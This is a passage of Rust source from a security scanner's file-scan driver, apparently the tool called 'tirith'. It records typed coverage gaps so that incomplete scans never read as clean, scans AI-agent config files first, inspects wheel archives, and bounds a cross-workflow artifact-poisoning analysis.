use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::engine::{self, AnalysisContext};
use crate::extract::ScanContext;
use crate::location::SubjectLocation;
use crate::tokenize::ShellType;
use crate::verdict::{Finding, RuleId, Severity};

/// Configuration for a file scan operation.
pub struct ScanConfig {
    /// Path to scan (directory or single file).
    pub path: PathBuf,
    /// Recurse into subdirectories.
    pub recursive: bool,
    /// Severity threshold for CI failure.
    pub fail_on: Severity,
    /// Glob patterns to ignore.
    pub ignore_patterns: Vec<String>,
    /// Include only files matching these patterns (empty = include all).
    pub include_patterns: Vec<String>,
    /// Exclude files matching these patterns (applied after include).
    pub exclude_patterns: Vec<String>,
    /// Max files to scan (None = unlimited).
    pub max_files: Option<usize>,
}

/// Result of a complete scan operation.
pub struct ScanResult {
    pub file_results: Vec<FileScanResult>,
    pub scanned_count: usize,
    pub skipped_count: usize,
    pub truncated: bool,
    pub truncation_reason: Option<String>,
    /// Files skipped specifically because a rule panicked while scanning them
    /// (a subset of `skipped_count`). Surfaced separately so an incomplete scan
    /// is distinguishable from benign size/IO skips and never reads as clean.
    pub panic_files: Vec<PathBuf>,
    /// Every coverage gap (a skipped/unanalyzed file that COULD matter) with a
    /// reason. A `Panicked` gap is recorded here in ADDITION to `panic_files`
    /// (the latter preserves the existing JSON shape). An oversized priority
    /// file, an unreadable file, an unsupported artifact (`.so`/`.whl`/...), or a
    /// file too large to even hash all land here, so a `--json`/SARIF consumer can
    /// see an incomplete scan instead of reading it as clean.
    pub coverage_gaps: Vec<CoverageGap>,
}

/// Result of scanning a single file.
pub struct FileScanResult {
    pub path: PathBuf,
    pub findings: Vec<Finding>,
    pub is_config_file: bool,
    /// Analyzer-originated coverage gaps for this otherwise-scanned subject.
    /// Kept on the file result so single-file callers do not have to discard
    /// either the findings or the typed incompleteness state.
    pub coverage_gaps: Vec<CoverageGap>,
}

impl FileScanResult {
    /// Analyzer-originated incompleteness is part of the scan result even when
    /// the filesystem driver itself produced no coverage gap.
    pub fn has_analysis_incomplete_finding(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete)
    }

    pub fn analysis_incomplete(&self) -> bool {
        !self.coverage_gaps.is_empty() || self.has_analysis_incomplete_finding()
    }
}
/// The outcome of attempting to scan one file: it was analyzed, or it was
/// skipped with a recorded reason (a [`CoverageGap`]). Replaces the lossy
/// `Option<FileScanResult>` so a skip can never be silently read as "clean".
pub enum ScanFileOutcome {
    /// The file was read and analyzed.
    Scanned(FileScanResult),
    /// The file was not analyzed; the gap carries why (and a best-effort hash).
    Skipped(CoverageGap),
}

/// The outcome of a panic-guarded single-file scan: either the scan completed
/// (with its own [`ScanFileOutcome`]), or a rule panicked while scanning (also
/// a coverage gap, kind [`CoverageGapKind::Panicked`]). Replaces the
/// `Result<Option<FileScanResult>, RulePanic>` return so the panic case is a
/// first-class coverage gap rather than a bare error.
pub enum GuardedScanOutcome {
    /// The scan ran to completion (it may itself be a `Skipped` outcome).
    Completed(ScanFileOutcome),
    /// A rule panicked; the file was not fully analyzed.
    RulePanic(CoverageGap),
}

/// Internal many-result form used by the directory driver. A byte-classified
/// wheel can produce member-qualified results plus coverage gaps, while an
/// ordinary unknown media file is an intentional ignore rather than a gap.
struct CandidateScanResult {
    file_results: Vec<FileScanResult>,
    coverage_gaps: Vec<CoverageGap>,
    intentionally_ignored: bool,
    /// C15: the bounded cross-workflow model for a `.github/workflows/*.yml`
    /// candidate, built from the SAME decoded bytes this scan already read.
    /// Returned by value rather than written through a captured `&mut` because
    /// `catch_panic_scanning` asserts unwind safety on this call and its contract
    /// requires the closure to capture no mutable state used after a panic.
    workflow: Option<crate::rules::workflow_artifacts::WorkflowModel>,
}

enum GuardedCandidateOutcome {
    Completed(CandidateScanResult),
    RulePanic(CoverageGap),
}

/// Why a matched file was NOT fully analyzed. Distinct from an INTENTIONAL
/// exclusion (an ignore/exclude pattern or ordinary media), which is never a
/// gap: a gap means "this could have mattered and we did not cover it".
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CoverageGapKind {
    /// File exceeds the analysis size ceiling ([`MAX_FILE_SIZE`]) but is small
    /// enough to hash within [`MAX_COVERAGE_HASH_BYTES`].
    Oversized,
    /// The file could not be opened or read (absent during a race, non-regular,
    /// symlinked final component, or a mid-read I/O error).
    Unreadable,
    /// The selected directory tree could not be completely enumerated: opening
    /// a root/subtree directory, reading one of its entries, or classifying an
    /// entry's metadata failed. Unlike an unreadable individual file, this gap
    /// is intrinsically security-relevant because the failed operation hides an
    /// unknown set of paths whose kinds cannot be determined.
    EnumerationFailed,
    /// The file was read only partially before being abandoned (reserved for the
    /// archive/streaming paths in later PRs; not produced by the generic scan).
    Truncated,
    /// A rule panicked while scanning the file.
    Panicked,
    /// A file kind with no analyzer yet (a native/artifact candidate like
    /// `.so`/`.dylib`/`.node`/`.wasm`/`.whl`). B8 adds magic dispatch into the
    /// real artifact scanner; until then these are coverage gaps, not silent drops.
    Unsupported,
    /// The file is larger than [`MAX_COVERAGE_HASH_BYTES`], so even hashing it
    /// would be unbounded; hashing was abandoned (a multi-terabyte file must not
    /// become a hashing DoS). Security-relevant regardless of extension.
    HashBudgetExceeded,
    /// An archive hit its entry-count budget ([`crate::artifact::archive::ArchiveLimits`]),
    /// so members beyond the cap were not inspected. A COVERAGE limit (the
    /// archive is `Accepted` with this gap), not a structural violation.
    EntryCountCapped,
    /// An archive reached its total-uncompressed byte budget while streaming, so
    /// the remaining members were not fully analyzed. A coverage limit, not a
    /// structural violation.
    TotalBytesCapped,
    /// An archive member's REAL streamed compression ratio exceeded the limit
    /// (a zip bomb), so the member was abandoned mid-stream. The declared
    /// uncompressed size is attacker-controlled, so this is enforced on the bytes
    /// actually read, never the declared size.
    CompressionRatioExceeded,
    /// An archive member's uncompressed size exceeds the per-member analysis cap,
    /// so it was not decompressed for analysis (a whole-member hash / streaming
    /// view may still be recorded). A coverage limit.
    MemberTooLarge,
    /// An archive member uses a compression method this build cannot decode (only
    /// deflate/store are enabled), so its content could not be inspected. A
    /// coverage limit, distinct from [`CoverageGapKind::Unsupported`] (a file
    /// KIND with no analyzer): here the bytes are simply undecodable.
    UnsupportedCompression,
    /// A native archive member was handed to the native triage as a streaming
    /// view (whole-member hash plus a printable-string scan) rather than a full
    /// random-access buffer, because it exceeds the native-parse cap; the deep
    /// native analysis is therefore truncated. A coverage limit.
    NativeTruncated,
    /// The PDF analyzer accepted ownership of the bytes but reported a typed
    /// parser/structure/coverage reason that prevented a complete analysis.
    PdfAnalyzerIncomplete,
}

impl CoverageGapKind {
    /// Every typed coverage-gap reason. Security-enforcing consumers use this in
    /// exhaustive contract tests so a gap kind cannot be silently omitted from
    /// fail-closed install behavior.
    pub const ALL: [Self; 14] = [
        Self::Oversized,
        Self::Unreadable,
        Self::EnumerationFailed,
        Self::Truncated,
        Self::Panicked,
        Self::Unsupported,
        Self::HashBudgetExceeded,
        Self::EntryCountCapped,
        Self::TotalBytesCapped,
        Self::CompressionRatioExceeded,
        Self::MemberTooLarge,
        Self::UnsupportedCompression,
        Self::NativeTruncated,
        Self::PdfAnalyzerIncomplete,
    ];

    /// A short stable wire token for JSON/SARIF.
    pub fn as_str(self) -> &'static str {
        match self {
            CoverageGapKind::Oversized => "oversized",
            CoverageGapKind::Unreadable => "unreadable",
            CoverageGapKind::EnumerationFailed => "enumeration_failed",
            CoverageGapKind::Truncated => "truncated",
            CoverageGapKind::Panicked => "panicked",
            CoverageGapKind::Unsupported => "unsupported",
            CoverageGapKind::HashBudgetExceeded => "hash_budget_exceeded",
            CoverageGapKind::EntryCountCapped => "entry_count_capped",
            CoverageGapKind::TotalBytesCapped => "total_bytes_capped",
            CoverageGapKind::CompressionRatioExceeded => "compression_ratio_exceeded",
            CoverageGapKind::MemberTooLarge => "member_too_large",
            CoverageGapKind::UnsupportedCompression => "unsupported_compression",
            CoverageGapKind::NativeTruncated => "native_truncated",
            CoverageGapKind::PdfAnalyzerIncomplete => "pdf_analyzer_incomplete",
        }
    }
}

/// A single coverage gap: WHERE the unanalyzed subject is, WHY it was skipped,
/// and a best-effort SHA-256 (lowercase hex) for later hash lookups. `sha256` is
/// `None` when hashing failed or was skipped (e.g. [`CoverageGapKind::Unreadable`]
/// or [`CoverageGapKind::HashBudgetExceeded`]).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CoverageGap {
    pub location: SubjectLocation,
    pub kind: CoverageGapKind,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
}

impl CoverageGap {
    /// The on-disk path most relevant to this gap (outer container or installed
    /// path), for the CI security-relevance and SARIF location decisions.
    pub fn primary_path(&self) -> Option<&Path> {
        self.location
            .outer_path
            .as_deref()
            .or(self.location.installed_path.as_deref())
    }
}

/// AI-specific config basenames scanned first. Generic names (settings.json)
/// are prioritized only inside a known config dir (via the parent-dir check).
const PRIORITY_BASENAMES: &[&str] = &[
    ".cursorrules",
    ".cursorignore",
    ".clinerules",
    ".windsurfrules",
    "CLAUDE.md",
    "AGENTS.md",
    "copilot-instructions.md",
    "mcp.json",
    ".mcp.json",
    "mcp_settings.json",
    "devcontainer.json",
];

/// Parent directories that make generic filenames count as priority.
const PRIORITY_PARENT_DIRS: &[&str] = &[
    ".claude",
    ".vscode",
    ".cursor",
    ".windsurf",
    ".cline",
    ".continue",
    ".github",
    ".devcontainer",
    ".roo",
];

/// Run a file scan operation.
///
/// Detection is always free (ADR-13). `max_files` is a caller-provided safety
/// cap (e.g. for resource-constrained CI), not a license gate.
pub fn scan(config: &ScanConfig) -> ScanResult {
    let diagnostics = ScanDiagnosticCapture::start(Some(&config.path));
    let collected = collect_files_for_scan(
        &config.path,
        config.recursive,
        &config.ignore_patterns,
        &config.include_patterns,
        &config.exclude_patterns,
        config.max_files,
    );
    let candidate_total = collected.candidate_total;
    let collection_work_exhausted = collected.collection_work_exhausted;
    let collection_unclassified_entries = collected.collection_unclassified_entries;
    let workflow_pattern_filtered = collected.workflow_pattern_filtered;
    let mut candidates = Vec::with_capacity(
        collected.text_candidates.len()
            + collected.linked_text_candidates.len()
            + collected.artifact_candidates.len(),
    );
    candidates.extend(
        collected
            .text_candidates
            .into_iter()
            .map(|path| ScanCandidate::Text {
                logical_path: path.clone(),
                read_path: path,
                expected_identity: None,
            }),
    );
    candidates.extend(
        collected
            .linked_text_candidates
            .into_iter()
            .map(|candidate| ScanCandidate::Text {
                read_path: candidate.read_path,
                logical_path: candidate.logical_path,
                expected_identity: candidate.identity,
            }),
    );
    candidates.extend(
        collected
            .artifact_candidates
            .into_iter()
            .map(|path| ScanCandidate::Text {
                logical_path: path.clone(),
                read_path: path,
                expected_identity: None,
            }),
    );
    candidates.sort_by(|a, b| {
        let a_priority = is_priority_file(a.logical_path());
        let b_priority = is_priority_file(b.logical_path());
        match (a_priority, b_priority) {
            (true, false) => std::cmp::Ordering::Less,
            (false, true) => std::cmp::Ordering::Greater,
            _ => a.logical_path().cmp(b.logical_path()),
        }
    });

    // One global budget covers every analysis attempt, regardless of whether
    // the candidate is text or an artifact. Collection failures already represent
    // attempts that could not be made, so they are skips but do not consume this
    // analysis-attempt budget.
    let retained_candidate_count = candidates.len();
    let max_candidates = config.max_files.unwrap_or(usize::MAX);
    let budget_skipped = candidate_total.saturating_sub(retained_candidate_count);
    candidates.truncate(max_candidates);

    let mut coverage_gaps = collected.coverage_gaps;
    let mut file_results = Vec::new();
    let collection_skipped = if collection_work_exhausted {
        collection_unclassified_entries.max(1)
    } else {
        0
    };
    let mut skipped_count = coverage_gaps.len() + budget_skipped + collection_skipped;
    let mut scanned_count = 0usize;
    let mut panic_files = Vec::new();

    // Load the threat DB ONCE for the whole artifact pass (the cache re-checks mtime
    // internally, so this is cheap, but we still hold the Arc rather than re-fetching
    // per artifact) and thread it into the hash-lookup seam. Latent today (the
    // hash-lookup seam returns None until the DB-B methods land), but this is the
    // correct wiring so the artifact path consults the same DB the engine does.
    let artifact_threat_db = crate::threatdb::ThreatDb::cached();
    // C15: the cross-workflow artifact-flow post-pass needs every workflow at
    // once, so each candidate's bounded model rides back out of the per-file
    // scan that already decoded its bytes. Only the MODEL is retained; the YAML
    // is dropped with the candidate, and `WorkflowBudget` caps how much of it a
    // repository can make this pass carry.
    let mut workflow_budget = WorkflowBudget::default();
    let mut workflow_models = Vec::new();
    for candidate in candidates {
        match candidate {
            ScanCandidate::Text {
                read_path,
                logical_path,
                expected_identity,
            } => {
                // Path-only classification, so the budget decision costs no I/O
                // and an exhausted budget stops the model being BUILT rather
                // than merely dropped afterwards.
                let is_workflow = crate::rules::cifile::classify(Some(logical_path.as_path()))
                    == Some(crate::rules::cifile::CiFileKind::GithubWorkflow);
                let step_budget = if is_workflow {
                    workflow_budget.remaining_steps()
                } else {
                    0
                };
                if is_workflow && step_budget == 0 {
                    workflow_budget.record_truncation(&logical_path, &mut coverage_gaps);
                }
                match scan_candidate_guarded_at(
                    &read_path,
                    &logical_path,
                    expected_identity,
                    artifact_threat_db.as_deref(),
                    step_budget,
                ) {
                    GuardedCandidateOutcome::Completed(mut result) => {
                        if result.intentionally_ignored {
                            continue;
                        }
                        match result.workflow.take() {
                            Some(model) => {
                                workflow_budget.admit(
                                    model,
                                    &mut workflow_models,
                                    &mut coverage_gaps,
                                );
                            }
                            // A workflow that was skipped for size or a read fault
                            // is a workflow the flow analysis never saw. Its gap is
                            // already recorded below; what matters here is that the
                            // post-pass loses the right to claim no chain exists.
                            None if is_workflow && step_budget > 0 => {
                                workflow_budget.complete = false;
                            }
                            None => {}
                        }
                        if result.coverage_gaps.is_empty() {
                            scanned_count += 1;
                        } else {
                            // Candidate-level counter: one partially/uninspected
                            // subject counts once, while the typed list retains every
                            // member-level reason.
                            skipped_count += 1;
                            coverage_gaps.append(&mut result.coverage_gaps);
                        }
                        file_results.append(&mut result.file_results);
                    }
                    GuardedCandidateOutcome::RulePanic(gap) => {
                        if is_workflow {
                            // A workflow that panicked mid-scan is a workflow the
                            // flow analysis never saw.
                            workflow_budget.complete = false;
                        }
                        record_panicked_subject(
                            logical_path,
                            gap,
                            &mut panic_files,
                            &mut skipped_count,
                            &mut coverage_gaps,
                        );
                    }
                }
            }
        }
        // Policy discovery occurs inside each candidate analysis. Drain its
        // captured raw diagnostics immediately so an unbounded file set cannot
        // accumulate an unbounded pre-redaction diagnostic vector.
        diagnostics.drain_policy_diagnostics();
    }

    // Anything that dropped a candidate WHOLESALE could have dropped a workflow,
    // so it costs the post-pass the right to claim that no chain exists: the
    // caller's `max_files` cap, an exhausted collection work budget, a directory
    // that could not be enumerated, and a pattern filter that removed a workflow
    // all hide unknown paths.
    let workflow_coverage_complete = workflow_budget.complete
        && budget_skipped == 0
        && !collection_work_exhausted
        && !workflow_pattern_filtered
        && !coverage_gaps
            .iter()
            .any(|gap| gap.kind == CoverageGapKind::EnumerationFailed);
    run_workflow_artifact_post_pass(
        config,
        &workflow_models,
        workflow_coverage_complete,
        &mut file_results,
        &mut coverage_gaps,
        &mut panic_files,
        &mut skipped_count,
    );
    diagnostics.drain_policy_diagnostics();

    let truncated = budget_skipped > 0 || collection_work_exhausted;
    let truncation_reason = config.max_files.and_then(|max| {
        if collection_work_exhausted {
            Some(format!(
                "Scan capped at {max} files/artifacts ({budget_skipped} matched candidate(s) omitted; collection work budget exhausted with {collection_skipped} additional directory entry/entries left unclassified)."
            ))
        } else {
            truncated.then(|| {
                format!("Scan capped at {max} files/artifacts ({budget_skipped} skipped).")
            })
        }
    });

    ScanResult {
        scanned_count,
        skipped_count,
        truncated,
        truncation_reason,
        panic_files,
        coverage_gaps,
        file_results,
    }
}

/// The repository-wide bound on the C15 cross-workflow artifact-flow post-pass:
/// at most [`workflow_artifacts::MAX_WORKFLOWS`] workflows,
/// [`workflow_artifacts::MAX_TOTAL_WORKFLOW_BYTES`] of aggregate YAML source, and
/// [`workflow_artifacts::MAX_TOTAL_STEPS`] modelled steps.
///
/// `complete` is the only thing that lets the post-pass claim the ABSENCE of a
/// chain. Any exhausted bound, any workflow that panicked, and any workflow that
/// did not parse clears it, so a bounded scan degrades to "not proven either
/// way" instead of to "clean".
struct WorkflowBudget {
    workflows: usize,
    bytes: usize,
    steps: usize,
    complete: bool,
    /// The stderr note is emitted once. Every dropped workflow still gets its own
    /// typed `CoverageGap`, so a monorepo cannot turn the bound into thousands of
    /// diagnostic lines while losing nothing machine-readable.
    announced: bool,
}

impl Default for WorkflowBudget {
    fn default() -> Self {
        Self {
            workflows: 0,
            bytes: 0,
            steps: 0,
            complete: true,
            announced: false,
        }
    }
}

impl WorkflowBudget {
    /// The step allowance a further workflow may spend, or 0 when any bound is
    /// already exhausted (which also stops the model being built at all).
    fn remaining_steps(&self) -> usize {
        use crate::rules::workflow_artifacts as wf;
        if self.workflows >= wf::MAX_WORKFLOWS || self.bytes >= wf::MAX_TOTAL_WORKFLOW_BYTES {
            return 0;
        }
        wf::MAX_TOTAL_STEPS.saturating_sub(self.steps)
    }

    /// Charge a built model against the budget and retain it, or drop it and
    /// record the gap. `Truncated` is the existing gap kind for "read only
    /// partially before being abandoned", and a `.github/workflows/*.yml`
    /// location is already security-relevant, so the gap becomes an
    /// `AnalysisIncomplete` finding through the normal driver path.
    fn admit(
        &mut self,
        model: crate::rules::workflow_artifacts::WorkflowModel,
        models: &mut Vec<crate::rules::workflow_artifacts::WorkflowModel>,
        gaps: &mut Vec<CoverageGap>,
    ) {
        use crate::rules::workflow_artifacts as wf;
        let next_bytes = self.bytes.saturating_add(model.source_bytes());
        if next_bytes > wf::MAX_TOTAL_WORKFLOW_BYTES {
            let path = model.path().to_path_buf();
            self.record_truncation(&path, gaps);
            return;
        }
        if model.steps_truncated() {
            let path = model.path().to_path_buf();
            self.record_truncation(&path, gaps);
        }
        self.bytes = next_bytes;
        self.workflows += 1;
        self.steps = self.steps.saturating_add(model.step_count());
        models.push(model);
    }

    fn record_truncation(&mut self, path: &Path, gaps: &mut Vec<CoverageGap>) {
        self.complete = false;
        if !self.announced {
            self.announced = true;
            emit_scan_diagnostic(format_args!(
                "tirith: scan: cross-workflow artifact analysis bound reached at {}; \
                 remaining workflows are recorded as coverage gaps",
                path.display()
            ));
        }
        gaps.push(CoverageGap {
            location: SubjectLocation::from_path(path.to_path_buf()),
            kind: CoverageGapKind::Truncated,
            sha256: None,
        });
    }
}

/// Record one panicked subject everywhere a consumer looks for it.
///
/// A `Panicked` coverage gap is the typed, detailed form, but it is not the only
/// form: `panic_files` is what the existing JSON shape exposes and
/// `skipped_count` is the candidate-level counter, and a reader consulting
/// either of those sees a clean scan if only the gap is recorded. Both panic
/// sites (the per-candidate guard and the workflow post-pass) route through here
/// so they cannot drift apart again -- they already had, which is the bug this
/// exists to prevent.
fn record_panicked_subject(
    logical_path: PathBuf,
    gap: CoverageGap,
    panic_files: &mut Vec<PathBuf>,
    skipped_count: &mut usize,
    coverage_gaps: &mut Vec<CoverageGap>,
) {
    *skipped_count += 1;
    panic_files.push(logical_path);
    coverage_gaps.push(gap);
}

/// Run the C15 cross-workflow artifact-flow analysis over every modelled
/// workflow and fold its output into the scan result.
///
/// Two outputs. (1) A proven producer-to-consumer chain becomes a
/// `WorkflowArtifactPoisoning` finding on a synthetic [`FileScanResult`] located
/// at the CONSUMER workflow, exactly as the `AnalysisIncomplete` driver attaches
/// its findings. (2) A `workflow_run` consumer this pass had FULL visibility into
/// and proved no chain for has its already-emitted presence-level
/// `WorkflowRunTrigger` finding lowered from High to Medium. The lowering happens
/// only here, never in `rules::cifile`, because `tirith check` on one workflow
/// file, `scan_single_file_guarded`, the MCP scan tool, and the LSP never run
/// this post-pass and must keep the original severity.
fn run_workflow_artifact_post_pass(
    config: &ScanConfig,
    models: &[crate::rules::workflow_artifacts::WorkflowModel],
    coverage_complete: bool,
    file_results: &mut Vec<FileScanResult>,
    coverage_gaps: &mut Vec<CoverageGap>,
    panic_files: &mut Vec<PathBuf>,
    skipped_count: &mut usize,
) {
    if models.is_empty() {
        return;
    }

    // The post-pass runs OUTSIDE the per-candidate panic guard, so it carries its
    // own: a bug here must degrade to a coverage gap, not abort the whole scan.
    let anchor = models[0].path().to_path_buf();
    let Some(flow) = catch_panic_scanning(&anchor, || {
        crate::rules::workflow_artifacts::analyze_repository(models, coverage_complete)
    }) else {
        // Goes through the same recorder as the per-candidate arm. This branch
        // used to push the coverage gap ALONE, which left `panic_files` and
        // `skipped_count` untouched -- and those are the fields the existing
        // JSON shape and the downstream completeness checks actually read, so a
        // panicked post-pass presented as a clean, complete scan.
        let gap = CoverageGap {
            location: SubjectLocation::from_path(anchor.clone()),
            kind: CoverageGapKind::Panicked,
            sha256: None,
        };
        record_panicked_subject(anchor, gap, panic_files, skipped_count, coverage_gaps);
        return;
    };

    // Discover policy from the SCAN TARGET (not the caller's cwd) so scanning
    // another tree applies THAT tree's repo policy, matching the driver's own
    // `AnalysisIncomplete` synthesis. Only a chain finding needs it, so a tree
    // with workflows but no chain pays nothing.
    let policy = (!flow.findings.is_empty())
        .then(|| crate::policy::Policy::discover(Some(&config.path.display().to_string())));

    for (path, finding) in flow.findings {
        let Some(policy) = policy.as_ref() else {
            continue;
        };
        let verdict = crate::escalation::finalize_static_verdict(
            vec![finding],
            policy,
            3,
            crate::verdict::Timings::default(),
        );
        if verdict.findings.is_empty() {
            continue;
        }
        file_results.push(FileScanResult {
            path,
            findings: verdict.findings,
            is_config_file: false,
            coverage_gaps: Vec::new(),
        });
    }

    for path in flow.unproven_consumers {
        for file_result in file_results.iter_mut().filter(|r| r.path == path) {
            for finding in &mut file_result.findings {
                // Only the rule's OWN default severity is lowered. An operator who
                // set `severity_overrides` on this rule has already made the call,
                // and the post-pass must not quietly overrule it.
                if finding.rule_id != crate::verdict::RuleId::WorkflowRunTrigger
                    || finding.severity != Severity::High
                {
                    continue;
                }
                finding.severity = Severity::Medium;
                finding.description.push_str(
                    " This repository scan modelled every workflow in the tree and found no \
                     workflow that both feeds this one an artifact from an untrusted run and \
                     reaches a dangerous sink with it, so the trigger is reported as a \
                     present-but-unproven risk rather than a proven chain.",
                );
            }
        }
    }
}

/// Magic-dispatch one artifact candidate into the artifact scanner (B8a). Returns
/// the member-qualified [`FileScanResult`]s its findings produce, plus every typed
/// [`CoverageGap`] from outer-file dispatch and accepted partial member analysis,
/// so an artifact is never silently dropped. A successfully inspected wheel with
/// NO findings still yields one empty result (located at the wheel).
///
/// Each finding becomes its OWN result located at the finding's member-qualified
/// path (`foo.whl!/pkg/bootstrap.pth`, B8f) when one is recoverable from the
/// finding's evidence, else the outer wheel path — so JSON/SARIF show the offending
/// member, not just the container. Policy override finalization is applied via
/// `evaluate_inspected_artifact` so a strict integrity policy's `action_overrides`
/// are honored on this path too (the verdict's findings carry the overridden
/// severities).
fn inspect_artifact_candidate_from_handle(
    path: &Path,
    file: std::fs::File,
    fallback_sha256: Option<String>,
    threat_db: Option<&crate::threatdb::ThreatDb>,
) -> (Vec<FileScanResult>, Vec<CoverageGap>) {
    use crate::artifact::inspect::{inspect_artifact_handle, InspectedArtifact};

    let inspected: InspectedArtifact = match inspect_artifact_handle(path, file) {
        Ok(i) => i,
        Err(e) => {
            // Not inspectable as a wheel: record a coverage gap (best-effort hash
            // for a later content-addressed lookup) so it is never read as clean.
            return (
                Vec::new(),
                vec![CoverageGap {
                    location: SubjectLocation::from_path(path.to_path_buf()),
                    kind: e.gap_kind(),
                    sha256: fallback_sha256,
                }],
            );
        }
    };

    // Discover the operator policy for this path so per-rule severity/action
    // overrides are honored (the artifact path is a static-verdict site too).
    let cwd = path
        .parent()
        .map(|p| p.display().to_string())
        .filter(|s| !s.is_empty());
    let policy = crate::policy::Policy::discover(cwd.as_deref());

    let verdict = crate::artifact::evaluate_inspected_artifact(
        &inspected.inspection,
        &inspected.native_findings,
        &policy,
        threat_db,
    );

    // The set of member-qualified location strings the inspection actually
    // produced (`<wheel>!/<member>`), gathered from the inspected files, signals,
    // and execution edges. `artifact_finding_location` resolves a finding's member
    // by EXACT membership in this set rather than scraping any `!/`-bearing token,
    // so a stray `!/` substring in evidence prose can never mislocate a finding.
    let known_members = known_member_locations(&inspected.inspection);

    let mut results: Vec<FileScanResult> = Vec::new();
    for finding in verdict.findings {
        // The scan driver owns coverage-finding assembly from `coverage_gaps` so
        // policy actions, SARIF locations, and exit status stay single-sourced.
        // `evaluate_inspected_artifact` also protects direct consumers, hence the
        // filtering here to avoid duplicate AnalysisIncomplete rows.
        if finding.rule_id == crate::verdict::RuleId::AnalysisIncomplete {
            continue;
        }
        // Locate the finding at its member-qualified location when one is present in
        // the evidence (B8f); else at the outer wheel.
        let loc = artifact_finding_location(&finding, path, &known_members);
        results.push(FileScanResult {
            path: loc,
            findings: vec![finding],
            is_config_file: false,
            coverage_gaps: Vec::new(),
        });
    }

    // A structurally REJECTED wheel (path traversal, encrypted member, CRC failure,
    // duplicate paths) must NEVER read as clean on the scan path: surface a coverage gap so
    // `tirith scan` does not exit 0 and report it clean. This mirrors pre-B8 (every wheel
    // was an Unsupported gap) and the package-inspect path, which forces Block on the same
    // condition. Any signal findings that DID fire from the partial inspection are returned
    // alongside the gap. `Unsupported` on a `.whl` is security-relevant, so the gap is not
    // silently benign.
    let mut coverage_gaps = inspected.inspection.effective_coverage_gaps();
    if inspected.rejected {
        coverage_gaps.push(CoverageGap {
            location: SubjectLocation::from_path(path.to_path_buf()),
            kind: CoverageGapKind::Unsupported,
            // The accepted inspection is already bound to the supplied handle.
            // Do not reopen the pathname merely to enrich this secondary gap.
            sha256: None,
        });
    }

    // A clean wheel (no findings) still counts as scanned: emit one empty result at
    // the outer wheel path.
    if results.is_empty() {
        results.push(FileScanResult {
            path: path.to_path_buf(),
            findings: Vec::new(),
            is_config_file: false,
            coverage_gaps: Vec::new(),
        });
    }

    (results, coverage_gaps)
}

/// The set of member-qualified location strings (`<wheel>!/<member>`) the
/// inspection actually produced, drawn from its files, signals, and execution
/// edges. `artifact_finding_location` matches a finding's evidence tokens against
/// THIS set, so a member location is recovered by exact identity with a real
/// member rather than by scraping any `!/`-bearing substring out of prose.
fn known_member_locations(inspection: &crate::artifact::ArtifactInspection) -> Vec<String> {
    let mut out: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let mut add = |loc: &SubjectLocation| {
        // Only locations that actually render with a `!/` member separator are
        // candidate member locations.
        if loc.member_path.is_some() {
            out.insert(loc.to_string());
        }
    };
    for f in &inspection.files {
        add(&f.location);
    }
    for s in &inspection.signals {
        add(&s.location);
    }
    for e in &inspection.execution_edges {
        add(&e.from);
        add(&e.to);
    }
    out.into_iter().collect()
}

/// Recover the member-qualified location (`foo.whl!/member`) for an artifact
/// finding by matching a token in its evidence against the inspection's KNOWN
/// member locations; else the outer artifact path. Matching against the real
/// member set (not any `!/`-bearing substring) is why a stray `!/` in evidence
/// prose can never mislocate a finding. Used so each artifact finding's
/// JSON/SARIF path names the offending member (B8f).
fn artifact_finding_location(finding: &Finding, outer: &Path, known_members: &[String]) -> PathBuf {
    use crate::verdict::Evidence;
    if !known_members.is_empty() {
        for ev in &finding.evidence {
            if let Evidence::Text { detail } = ev {
                for token in detail.split_whitespace() {
                    let cleaned = token.trim_matches(|c| matches!(c, '\'' | '"' | '(' | ')' | ','));
                    // EXACT membership in the inspection's real member locations.
                    if known_members.iter().any(|m| m == cleaned) {
                        return PathBuf::from(cleaned);
                    }
                }
            }
        }
    }
    outer.to_path_buf()
}

/// Maximum analyzable content size: 10 MiB. Large enough for any realistic
/// config/source file, small enough that a hostile `.git/objects/pack-*.pack`
/// (or a huge editor buffer opened via the LSP server) won't blow us up.
/// Exposed so the file-scan path here and the in-memory LSP document path
/// (`tirith` crate `cli::lsp`) enforce the SAME ceiling from one definition.
pub const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024;

/// Maximum bytes hashed for a coverage gap's SHA-256. A file BETWEEN
/// [`MAX_FILE_SIZE`] and this is too big to analyze but small enough to hash for
/// a later content-addressed lookup (an `Oversized` gap WITH a hash). A file
/// LARGER than this is abandoned with a [`CoverageGapKind::HashBudgetExceeded`]
/// gap (no hash) so a multi-terabyte payload can never become an unbounded
/// hashing DoS. Set well above [`MAX_FILE_SIZE`] (1 GiB) so the common oversized
/// case still yields a usable digest.
pub const MAX_COVERAGE_HASH_BYTES: u64 = 1024 * 1024 * 1024;

/// Classify a file of `size` bytes into the coverage-gap kind for a file that is
/// too large to analyze, deciding ONLY between [`CoverageGapKind::Oversized`]
/// (hashable) and [`CoverageGapKind::HashBudgetExceeded`] (too big to hash).
/// Pure so the budget boundary is unit-testable without a multi-gigabyte file.
fn oversized_gap_kind(size: u64, hash_budget: u64) -> CoverageGapKind {
    if size > hash_budget {
        CoverageGapKind::HashBudgetExceeded
    } else {
        CoverageGapKind::Oversized
    }
}

std::thread_local! {
    static SCAN_DIAGNOSTIC_CONTEXTS: std::cell::RefCell<Vec<ScanDiagnosticState>> =
        const { std::cell::RefCell::new(Vec::new()) };
}

struct ScanDiagnosticState {
    compiled: crate::redact::CompiledCustomPatterns,
    output: crate::verdict::BoundedTextBuilder,
}

/// One invocation-wide boundary for core scan diagnostics. Policy discovery is
/// captured before its DLP plan is known; once frozen, every diagnostic goes
/// through redact-sanitize-redact, physical-line confinement, and one shared
/// 256-KiB presentation envelope. This applies equally when a JSON CLI caller
/// leaves stderr visible.
struct ScanDiagnosticCapture {
    policy_capture: Option<crate::policy::PolicyDiagnosticCapture>,
    active: bool,
}

impl ScanDiagnosticCapture {
    fn start(path: Option<&Path>) -> Self {
        let policy_capture = crate::policy::PolicyDiagnosticCapture::start();
